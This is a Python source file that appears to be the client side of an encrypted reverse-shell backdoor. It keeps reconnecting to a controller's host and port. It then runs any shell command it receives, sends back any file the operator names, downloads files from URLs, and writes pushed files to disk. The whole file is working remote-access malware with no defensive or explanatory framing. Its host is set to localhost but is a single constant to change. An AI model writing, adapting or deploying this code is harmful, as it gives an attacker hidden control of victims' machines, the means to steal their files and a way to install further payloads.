#!/usr/bin/env python3

import os
import sys
import time
import socket
import subprocess as sp
from cipher import get_cipher
from urllib.request import urlopen
from common import pr, Send, Receive

HOST = '127.0.0.1'
PORT = 1000

sock = None
cwd = os.getcwd()
ret = '' # '' or 'xxx'

def upload(sock, fn):
  try:
    f = open(fn, 'rb')
    d = f.read()
    f.close()
    Send(sock, cipher, d, fn)
    return True
  except Exception as e:
    return str(e) + ' ⚠️'

def dlhttp(sock, url):
  fn = url.split('/')[-1]
  fn = fn.split('?')[0]
  fn = fn.split('#')[0]
  try:
    f = open(fn, 'wb')
    f.write(urlopen(url).read())
    f.close()
    return 'Download finished 🍺'
  except Exception as e:
    return str(e) + ' ⚠️'

# @return: '' or 'xxx'
def run(s):
  global cwd
  if s.startswith('cd'):
    try:
      os.chdir(s[3:])
      cwd = os.getcwd()
      return ''
    except Exception as e:
      return str(e) + ' ⚠️'
  p = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
  out, err = p.communicate()
  if out or out == b'':
    return out.decode()
  else:
    return err.decode()

def res(ret):
  global cwd
  if ret == '':
    return cwd + '>'
  else:
    return ret + '\n' + cwd + '>'

while True:
  try:
    sock = socket.socket()
    sock.connect((HOST, PORT))
  except socket.error:
    sock.close()
    time.sleep(10)
    continue

  cipher = get_cipher()
  decipher = get_cipher()

  while True:
    data = Receive(sock, decipher)

    if not data:
      sock.close()
      break

    if type(data) == str:
      if data.startswith('dl '):
        ret = upload(sock, data[3:])
        if ret == True:
          continue
      elif data.startswith('dlhttp '):
        ret = dlhttp(sock, data[7:])
      else:
        ret = run(data)
    else:
      try:
        f = open(data[0], 'wb')
        f.write(data[1])
        f.close()
        ret = 'File received 🍺'
      except Exception as e:
        ret = str(e) + ' ⚠️'

    Send(sock, cipher, res(ret))
